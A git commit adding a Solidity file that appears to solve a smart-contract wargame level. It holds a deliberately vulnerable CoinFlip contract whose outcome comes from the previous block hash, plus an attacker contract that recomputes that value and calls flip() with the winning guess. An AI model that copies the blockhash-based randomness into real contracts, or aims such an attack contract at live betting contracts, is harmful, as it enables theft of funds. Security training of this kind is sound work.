cc1cdd813e4a263c8a7e95365e263218713d1ee6
Asamartino <61462365+Asamartino@users.noreply.github.com>
2020-03-02 15:51:48 +0100

    Create CoinFlipSolution.sol

---
+++ CoinFlipSolution.sol
@@ -0,0 +1,51 @@
+pragma solidity ^0.6.3;
+
+import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol';
+
+contract CoinFlip {
+
+  using SafeMath for uint256;
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() public {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+
+
+contract CartmansIncredibleGift{
+    using SafeMath for uint256;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip victim;
+    
+    function rightGuess(address _victim) public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1))); 
+        uint256 coinFlip = blockValue.div(FACTOR);
+        victim = CoinFlip(_victim);
+        bool side = coinFlip == 1 ? true : false;
+        victim.flip(side);
+
+  } 
+}
